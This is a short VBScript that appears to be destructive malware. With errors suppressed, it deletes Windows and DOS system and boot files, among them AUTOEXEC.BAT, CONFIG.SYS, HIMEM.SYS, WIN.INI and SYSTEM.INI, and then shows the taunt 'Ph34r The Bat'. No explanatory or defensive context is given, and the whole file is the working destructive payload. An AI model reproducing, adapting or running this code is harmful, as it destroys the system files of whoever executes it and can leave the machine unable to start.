On Error Resume Next
Dim fso, f1, f2, s
Set fso = CreateObject("Scripting.FileSystemObject")
Set f2 = fso.GetFile("C:\AUTOEXEC.BAT")
f2.Delete
Set f2 = fso.GetFile("C:\WINDOWS\HIMEM.SYS")
f2.Delete
Set f2 = fso.GetFile("C:\WINDOWS\EMM386.EXE")
f2.Delete
Set f2 = fso.GetFile("C:\CONFIG.SYS")
f2.Delete
Set f2 = fso.GetFile("C:\WINDOWS\WIN.INI")
f2.Delete
Set f2 = fso.GetFile("C:\WINDOWS\SYSTEM.INI")
f2.Delete
Set f2 = fso.GetFile("C:\WINDOWS\PROTOCOL.INI")
f2.Delete
MsgBox "Ph34r The Bat"